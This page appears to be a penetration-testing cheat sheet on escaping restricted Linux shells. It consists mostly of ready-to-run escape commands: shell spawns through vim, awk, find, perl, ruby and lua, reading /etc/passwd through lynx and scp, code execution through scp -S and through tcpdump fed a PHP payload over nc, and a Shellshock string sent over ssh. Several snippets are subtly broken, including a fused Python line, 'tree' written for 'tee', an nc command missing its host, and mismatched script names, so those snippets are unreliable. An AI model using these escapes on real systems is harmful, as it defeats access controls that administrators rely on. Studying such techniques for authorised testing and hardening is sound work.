---
menu: Escape Restricted Shells
title: How to Escape from Restricted Shells
weight: 403
---

# Escape from Restricted Shells

## At a Glance

Restricted shells
limit the default available capabilities
of a regular shell
and allow only a subset of system commands.
Typically,
a combination of some or all
of the following restrictions
are set[^sans-restricted-shells]:

- Using the `cd` command.
- Setting or unsetting environment variables.
- Commands that contain slashes.
- Filename containing a slash as an argument to the `.` built-in command.
- Filename containing a slash as an argument to the `-p` option to the `hash` built-in command.
- Importing function definitions from the shell environment at startup.
- Parsing the value of `SHELLOPTS` from the shell environment at startup.
- Output redirection using the `>`, `>|`, `"`, `>&`, `&>`, and `>>` operators.
- Using `-exec` built-in to replace the shell with another command.
- Adding or deleting built-in commands with the `-f` and `-d` options to the enable built-in.
- Using the `enable` built-in command to enable disabled shell built-ins.
- Specifying the `-p` option to the `command` built-in.
- Turning off restricted mode with `set +r` or `set +o restricted`.

## Reconnaissance

The `env` command
returns information
about the current `SHELL` and `PATH`.
If it's not available,
try echoing `$0` and `$PATH`
separately.
[^0-nixcraft]

{{<note>}}
`$0` returns the name of the running process.
If used inside of a shell
it will return the name of the shell.
{{</note>}}

List the `PATH` content
to see which commands are available.
If `ls` is not available,
you can `echo *` to "glob"
the directory's content.

```sh
echo /usr/local/rbin/*
```

Research each available command
to see if there are known shell escapes associated with them.
Some of the techniques can be combined together.

## Environment Variables

Look for writable variables.
Execute `export -p` to list exported variables.
Most of the time `SHELL` and `PATH` will be `-rx`,
meaning they are executable but not writable.
If they are writable,
simply set `SHELL` to your shell of choice,
or `PATH` to a directory with exploitable commands.

## Copying Files

Try to find writable directories
where you can execute commands from,
inside,
or outside your `PATH`.

{{<note>}}
If you're able
to copy a file into `PATH`,
then you'll be able
to bypass the forward-slash restriction.
{{</note>}}

Other ways to copy files,
or get access to them,
include mounting devices,
use programs like `scp` or `ftp`,
or create symbolic links.

## Programs

### Vim

#### Bash

```sh
:set shell=/bin/bash
:shell
```

#### Command execution

```sh
:! /bin/ps
```

### Mail

`$VISUAL` sets the program to invoke
when the visual editor is called.

```sh
set VISUAL=/bin/vi
mail -s "subject" user@mail.com
```
Start the visual editor with `~v` and [escape VIM](#vim).

### Lynx[^lynx-doc]

```sh
lynx /etc/passwd
```

Enter the options with `o`,
change the `Editor` to `/bin/vi`.
Edit the file with `e`
and [escape VIM](#vim)

### Elinks

Set `EDITOR` to `/bin/vi`.
Open a webpage
and edit a textbox.
[Escape VIM](#vim)

### AWK

```sh
awk 'BEGIN {system("/bin/sh")}'
```

### Find

```sh
find / -name 0xffsec -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

### SCP [^scp-pentestmonkey]

Read files with `-F`

```sh
scp -F /etc/passwd validfile remote:
```

Run commands with `-S`.

```sh
echo $'#!/bin/sh\n/usr/bin/id' > script.sh
chmod +x script.sh
scp -S ./script validfile remote:
```

{{<details "Parameters">}}
- `-F <file>`: Specifies an alternative per-user configuration file for ssh.
- `-S <program>`: Name of program to use for the encrypted connection.
{{</details>}}

### TCPDump[^tcpdump]

Use tcpdump to capture network traffic
containing a malicious script.

```sh
tcpdump -n -G 1 -z /usr/bin/php -U -A udp port 8080
```
{{<details "Parameters">}}
- `-n`: Don't convert addresses (i.e., host addresses, port numbers, etc.) to names.
- `-G <seconds>`: Rotates the dump file specified with the `-w` option every `<seconds>` sec.
- `-w <file>`: Write  the  raw  packets to file rather than parsing and printing them out.
- `-U`: If the `-w` option is not specified, make the printed packet output `packet-buffered` (it will be written to the  standard  output).
- `-z <command> <file>`: Used in conjunction with the `-C` or `-G` options, this will make tcpdump run `<command>` where `<file>` is the savefile being closed after each rotation.
- `-A`: Print each packet (minus its link level header) in ASCI
{{</details>}}

Send a network packet
with the PHP script.

```sh
echo "<?php system('id');?>" | nc -u 8080
```

### Others

Programs such as `more`,
`less`,
`man`,
`ftp`,
`gdb`
let you run subshells.
Type `!` followed by a command.
Try the following:

```sh
'! /bin/sh'
'!/bin/sh'
'!bash'
```

## Languages

Try invoking a shell through an available language.

### Python
```python
exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
```

### Perl
```perl
exec "/bin/sh";
```

```sh
perl -e 'exec "/bin/sh";'
```

### Ruby / irb

```ruby
exec "/bin/sh"
```

### Lua
```sh
os.execute('/bin/sh')
```

## Unrestricted Mode

Some restricted shells start
running files in an unrestricted mode
before the restricted shell is applied.
If `.bash_profile` is executed in an unrestricted mode,
and it's editable,
you'll be able to execute code and commands
as an unrestricted user.

## From The Outside

### Command Execution

Execute a command
before the remote shell is loaded.

```sh
ssh user@{{< param "war.rhost" >}} -t "/bin/sh"
```
### Profile

Start a remote shell
with an unrestricted profile.

```sh
ssh user@{{< param "war.rhost" >}} -t "bash --noprofile"
```

### Shellshock

```sh
ssh user@{{< param "war.rhost" >}} -t "(){:;}; /bin/bash"
```

## Miscellaneous

### Output Redirection

Since redirection operators (`>` or `>>`)
are usually restricted,
the `tee` command can help you
redirect the output of,
for example,
the `echo` command.

```sh
echo '#!/usr/bin/env bash' | tree script.sh
echo '# Your code' | tee -a script.sh
```
## Further Reading

- [GTFOBins](https://gtfobins.github.io/)

[^scp-pentestmonkey]: “Breaking out of Rbash Using Scp.” Pentestmonkey | Taking the Monkey Work out of Pentesting, http://pentestmonkey.net/blog/rbash-scp.
[^0-nixcraft]: “$0 - Linux Shell Scripting Tutorial - A Beginner’s Handbook.” NixCraft – Bash Shell Scripting Directory, https://bash.cyberciti.biz/guide/$0.
[^sans-restricted-shells]: Wright, Joshua. “SANS Penetration Testing | Escaping Restricted Linux Shells.” SANS Institute.
[^lynx-doc]: “Lynx Users Guide.” LYNX – The Text Web-Browser, https://lynx.invisible-island.net/lynx_help/Lynx_users_guide.html#LocalSource.
[^tcpdump]: “How to Break out of Restricted Shells with Tcpdump.” Insinuator.Net, https://insinuator.net/2019/07/how-to-break-out-of-restricted-shells-with-tcpdump/.
